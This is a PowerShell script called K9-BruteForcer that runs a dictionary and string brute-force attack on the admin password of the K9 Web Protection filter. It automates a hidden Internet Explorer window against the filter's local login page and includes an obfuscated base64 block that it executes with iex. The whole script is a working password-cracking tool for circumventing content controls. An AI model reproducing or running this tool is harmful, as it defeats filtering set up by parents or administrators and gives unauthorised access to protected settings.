<#
|===============================================================>|
   K9-BruteForcer by APoorv Verma [AP] on 8/25/2013
|===============================================================>|
      $) Supports BruteForce using multiple Dictionaries
      $) Supports BruteForce using multiple Strings
      $) Supports Hybrid BruteForce
      $) Allows Pipelining of Passwords or Dictionaries
      $) Following Shortcuts are supported
           #) Press 'x' to quit
           #) Press 'Enter' to show status
           #) Press 's' to show Intenet Explorer with bruteforcer
           #) Press 'h' to hide Intenet Explorer with bruteforcer
|===============================================================>|
#>
param([Alias("Psw","Password")][String[]]$Passwords,[Alias("Dict","Dictionary")][String[]]$Dictionaries,[Switch]$Debug=$False,[Alias("ShowIE","ShowBrowser")][Switch]$ShowIEWIndow=$False,[Alias("SPB","Progress")][Switch]$ShowProgressBar=$False)
# =======================================START=OF=COMPILER==========================================================|
#    The Following Code was added by AP-Compiler Version [1.0] To Make this program independent of AP-Core Engine
# ==================================================================================================================|
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gS2V5UHJlc3NlZCB7CgpwYXJhbShbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldW1N0cmluZ1tdXSRLZXksICRTdG9yZT0iXl5eIikNCg0KICAgIGlmICgkU3RvcmUgLWVxICJeXl4iIC1hbmQgJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKSB7JFN0b3JlID0gJEhvc3QuVUkuUmF3VUkuUmVhZEtleSgiSW5jbHVkZUtleVVwLE5vRWNobyIpfSBlbHNlIHtpZiAoJFN0b3JlIC1lcSAiXl5eIikge3JldHVybiAkRmFsc2V9fQ0KICAgICRBbnMgPSAkRmFsc2UNCiAgICAkS2V5IHwgJSB7DQogICAgICAgICRTT1VSQ0UgPSAkXw0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJEFucyA9ICRBbnMgLW9yIChLZXlQcmVzc2VkQ29kZSAkU09VUkNFICRTdG9yZSkNCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICBGb3JlYWNoICgkSyBpbiAkU09VUkNFKSB7DQogICAgICAgICAgICAgICAgW1N0cmluZ10kSyA9ICRLDQogICAgICAgICAgICAgICAgaWYgKCRLLmxlbmd0aCAtZ3QgNCAtYW5kICgkS1swLDEsLTEsLTJdIC1qb2luKCIiKSkgLWVxICJ+fn5+Iikgew0KICAgICAgICAgICAgICAgICAgICAkQW5zID0gJEFOUyAtb3IgKEtleVByZXNzZWRDb2RlIChLZXlUcmFuc2xhdGUoJEspKSAkU3RvcmUpDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJEFucyA9ICRBTlMgLW9yICgkSy5jaGFycygwKSAtaW4gJFN0b3JlLkNoYXJhY3RlcikNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRBbnMNCn0KCmZ1bmN0aW9uIEludm9rZS1UZXJuYXJ5IHsKCnBhcmFtKFtib29sXSRkZWNpZGVyLCBbc2NyaXB0YmxvY2tdJGlmdHJ1ZSwgW3NjcmlwdGJsb2NrXSRpZmZhbHNlKQ0KDQogICAgaWYgKCRkZWNpZGVyKSB7ICYkaWZ0cnVlfSBlbHNlIHsgJiRpZmZhbHNlIH0NCn0KCmZ1bmN0aW9uIFdyaXRlLUFQIHsKCnBhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV1bU3RyaW5nXSRUZXh0KQ0KDQogICAgJGFjYyAgPSBAKCgnKycsJzInKSwoJy0nLCcxMicpLCgnIScsJzE0JyksKCcqJywnMycpKQ0KICAgICR0YiAgID0gJyc7JGZ1bmMgICA9ICRmYWxzZQ0KICAgIHdoaWxlICgkVGV4dC5jaGFycygwKSAtZXEgJ3gnKSB7JGZ1bmMgPSAkdHJ1ZTsgJFRleHQgPSAkVGV4dC5zdWJzdHJpbmcoMSkudHJpbSgpfQ0KICAgIHdoaWxlICgkVGV4dC5jaGFycygwKSAtZXEgJz4nKSB7JHRiICs9ICIgICAgIjsgJFRleHQgPSAkVGV4dC5zdWJzdHJpbmcoMSkudHJpbSgpfQ0KICAgICRTaWduID0gJFRleHQuY2hhcnMoMCkNCiAgICAkVGV4dCA9ICRUZXh0LnN1YnN0cmluZygxKS50cmltKCkucmVwbGFjZSgnL3hcJywnJykucmVwbGFjZSgnWy5dJywnW0N1cnJlbnQgRGlyZWN0b3J5XScpDQogICAgJHZlcnMgPSAkZmFsc2UNCiAgICBmb3JlYWNoICgkYXIgaW4gJGFjYykge2lmICgkYXJbMF0gLWVxICRzaWduKSB7JHZlcnMgPSAkdHJ1ZTsgJGNsciA9ICRhclsxXTsgJFNpZ24gPSAiWyR7U2lnbn1dICJ9fQ0KICAgIGlmICghJHZlcnMpIHtUaHJvdyAiSW5jb3JyZWN0IFNpZ24gWyRTaWduXSBQYXNzZWQhIn0NCiAgICBpZiAoISgkU2lsZW50IC1hbmQgJFNpZ24gLWVxICdbKl0gJykpIHtpZiAoJGZ1bmMpICB7V3JpdGUtSG9zdCAtbm9uZXdsaW5lIC1mICRjbHIgJHRiJFNpZ24kVGV4dH0gZWxzZSB7d3JpdGUtaG9zdCAtZiAkY2xyICR0YiRTaWduJFRleHR9fQ0KfQoKU2V0LUFsaWFzID86IEludm9rZS1UZXJuYXJ5")))
# ========================================END=OF=COMPILER===========================================================|
. .\Modules.ps1 | out-null
try {
    if ((Get-Service -Name bckwfs).status -ne "Running") {
        Write-AP "-K9 Service is not running, will Enable"
        Start-Service -Name bckwfs
        if (!$?) {Write-AP ">-Failed to Enable K9";Write-Host "";exit} Else {
            Write-AP ">+K9 Service was enabled"
        }
        start-Sleep -s 5
    }
} catch {
    Write-AP "-K9 Service is not installed on this System . . .";Write-Host "";exit
}
function Get-PRP ($SCR,$Size,$Phrase) {
    $PswSZ   = $SCR-$Size;$PRP1 = [math]::truncate($PswSZ/2);$PRP2 = $PRP1+(?:(($PswSZ/2).GetType().Name -like "int*"){0}{1})
    return (?:($Phrase.Length -gt $PswSZ){$Phrase.substring(0,$PRP1-2)+"..."+$Phrase.substring($Phrase.Length-1-$PRP2-2,$PRP2-1)}{$Phrase})
}
try {$Passwords += $Input.split(" ")} catch {}
if ($Passwords -eq $Null -and $Dictionaries -eq $Null) {Write-AP "-All Parameters cannot be empty!";Write-Host "";exit}
$pwdo = $pwd
$Scr = $Host.UI.RawUI.WindowSize.width
if ($Scr -lt 80) {$Scr = 80}
$Hacked = $false
$Pass = ""
Write-AP "*Adjusting invalid entries"
foreach ($PSW in $Passwords) {
    If (test-path $PSW -Type Leaf) {
        if ($Debug) {Write-AP ">!Migrating [$(Get-PRP $SCR (1+8+11+17) $PSW)] to Dictionaries"}
        $Dictionaries += $PSW
        $Passwords = $Passwords | ? {$_ -ne $PSW}
    }
}
foreach ($Dict in $Dictionaries) {
    If (!(test-path $Dict -Type Leaf)) {
        if ($Debug) {Write-AP ">!Migrating [$(Get-PRP $SCR (1+8+11+14) $Dict)] to Passwords"}
        $Passwords += $Dict
        $Dictionaries = $Dictionaries | ? {$_ -ne $Dict}
    }
}
if ($Dictionaries -ne $null) {$Dictionaries = $Dictionaries | % {Convert-Path $_}}
cd $env:temp
$IE = New-Object -com InternetExplorer.Application
$IE.Navigate("http://127.0.0.1:2372")
Load($IE)
if ($ShowIEWIndow) {$IE.visible = $True}
Write-AP "*Aquiring Password Prompt"
Try {
    $IE.Document.getElementById("btn-setup").click()
    $PSWBox = $IE.Document.getElementById("b-loginContain")
    $OKBtn  = $IE.Document.getElementById("o-loginContain")
} catch {
    Write-AP "-Browser Internal Error"
    $IE.quit()
    cd $PWDO
    Write-Host ""
    exit
}
function Hack ($IE,[String]$Password) {
    $PSWBox.value = $Password
    $OKBtn.click()
    Load($IE,12)
    TRY {
        $PSWBox.value = "AP"
        return $False
    } catch {
        return $True
    }
#    if ($IE.Document.getElementById("logout") -ne $null){
#        return $True
#    } else {
#        return $False
#    }
}
function Detect-Keys ([String]$Password, $Percent, [String]$Dict) {
    if ($Host.UI.RawUI.KeyAvailable) {
        $Store = $Host.UI.RawUI.ReadKey("IncludeKeyUp,IncludeKeyDown,NoEcho")
        if (!$Store.KeyDown) {Continue}
        if (KeyPressed 'x','q',"~~ESCAPE~~" $Store) {Write-AP "!Quit Signal, exiting . . .";$IE.quit();cd $PWDO;Write-Host "";exit}
        elseif (KeyPressed ' ',"~~Enter~~" $Store) {
            $PS = ?:($LPS -eq "xx") {0} {1/((Get-Date).TimeOfDay - $LPS).TotalSeconds}
            $io = (1+12+17+9+3+6+4)
            Write-AP ">>*KeyWord [$(Get-PRP $SCR ($SCR-[math]::truncate(($SCR-$IO)/2)) $Password)] at $Percent of $(Get-PRP $SCR ($SCR-[math]::truncate(($SCR-$IO)/2)) $Dict) @ $([System.Math]::Round($PS,2)) Keys/sec"
        }
        elseif ((KeyPressed 'h','-' $Store) -and $IE.visible) {Write-AP ">>*Hiding Internet Window . . .";$IE.visible = $False}
        elseif ((KeyPressed 's','+','v' $Store) -and !$IE.visible) {Write-AP ">>*Showing Internet Window . . .";$IE.visible = $True}
    }
}
Write-AP "*Initiating BruteForcing . . ."
$ONtime = $(Get-Date).TimeOfDay
$LPS = "xx"
$ALG = 0
if ($Passwords -ne $Null) {
    $cb = 1
    $op = 0
    $np = $Passwords.count
    Write-AP ">*Using Supplied Passwords [$np KeyWords]"
    foreach ($psw in $Passwords){
        if ([String]::IsNullOrEmpty($Psw)) {continue}
        $OP++
        $LA = $OP/$NP
        if ($ShowProgressBar) {
            write-progress -activity "BruteForcing K9" -status 'Dictionary [Strings]' -percentcomplete ($LA*100) 
            write-progress -id 1 -activity " " -status 'Total Progress' -percentcomplete ($LA/($Dictionaries.Count+$cb)*100) -currentOperation "Password [$OP/$NP]"
        }
        if (Hack $IE $psw) {$Hacked = $True;$Pass = $psw;break}
        Detect-Keys $psw ("{0:P0}" -f $LA) "Strings"
        $LPS = $(Get-Date).TimeOfDay
    }
    $ALG += 1
}
if (!$Hacked -and $Dictionaries -ne $Null) {
    foreach ($Dict in $Dictionaries){
        $Dictionary = [io.file]::ReadAllLines($Dict) | ? {!([String]::IsNullOrEmpty($_))}
        $op = 0
        $np = $Dictionary.count
        Write-AP ">*Using Dictionary - [$(Get-PRP $SCR (1+8+20+3+(''+$NP).Length+10) $Dict)] [$np KeyWords]"
        foreach ($Term in $Dictionary) {
            $OP++
            $LA = $OP/$NP
            if ($ShowProgressBar) {
                write-progress -activity "BruteForcing K9" -status "Dictionary [$(Get-PRP $SCR ($SCR-15) $Dict)]" -percentcomplete ($LA*100)
                write-progress -id 1 -activity " " -status 'Total Progress' -percentcomplete (($ALG+$LA)/($Dictionaries.Count+$cb)*100) -currentOperation "Password [$OP/$NP]"
            }
            if (Hack $IE $Term) {$Hacked = $True;$Pass = $Term;break}
            Detect-Keys $term ("{0:P0}" -f $LA) $Dict
            $LPS = $(Get-Date).TimeOfDay
        }
        $ALG += 1
    }
}
$ONtime = ($(Get-Date).TimeOfDay - $ONtime)
$OFFtime = ?:($ONtime.Hours -ne 0){""+$ONtime.Hours+" Hours"}{}
$OFFtime += ?:($ONtime.Minutes -ne 0){", "+$ONtime.Minutes+" Minutes"}{}
$OFFtime += ?:($ONtime.Seconds -ne 0){", and "+$ONtime.Seconds+" Seconds"}{}
$OFFtime += ?:($OFFtime -eq $Null){""+$ONtime.Milliseconds+" MilliSeconds"}{}
$OFFtime = $OFFtime.trim(", ").trim("and ").replace("1 Seconds","1 Second").replace("1 Hours","1 Hour").replace("1 Minutes","1 Minute")
if ($Hacked) {
    Write-AP "+Hacked K9 with KeyWord [$Pass] in $Offtime"
} else {
    Write-AP "-Failed to BruteForce K9"
}
Write-Host ""
$IE.quit()
cd $Pwdo
